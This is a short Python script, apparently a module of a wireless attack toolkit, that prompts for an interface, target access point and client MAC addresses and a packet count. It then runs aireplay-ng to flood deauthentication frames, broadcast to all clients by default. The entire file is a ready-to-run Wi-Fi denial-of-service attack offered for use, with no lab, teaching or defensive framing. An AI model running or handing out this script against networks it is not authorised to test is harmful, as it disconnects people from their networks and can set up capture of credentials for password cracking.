#!/usr/bin/env python3
# Deauth Attack Module

import os, sys, time, subprocess

def run():
    print("\n" + "="*60)
    print("DEAUTH ATTACK")
    print("="*60)
    
    interface = input("WiFi interface [wlan0mon]: ").strip() or "wlan0mon"
    bssid = input("Target AP MAC: ").strip()
    client = input("Target Client MAC (or broadcast): ").strip() or "FF:FF:FF:FF:FF:FF"
    count = int(input("Number of deauth packets [100]: ").strip() or "100")
    
    print(f"\nStarting deauth attack:")
    print(f"  Interface: {interface}")
    print(f"  AP: {bssid}")
    print(f"  Client: {client}")
    print(f"  Packets: {count}")
    print("Press Ctrl+C to stop")
    
    try:
        cmd = f"aireplay-ng --deauth {count} -a {bssid} -c {client} {interface}"
        print(f"Running: {cmd}")
        subprocess.run(cmd.split())
        print("\nDeauth attack completed!")
    except KeyboardInterrupt:
        print("\nStopped by user")
    except:
        print("aireplay-ng not installed")
        print("Install aircrack-ng: sudo apt install aircrack-ng")

if __name__ == "__main__":
    run()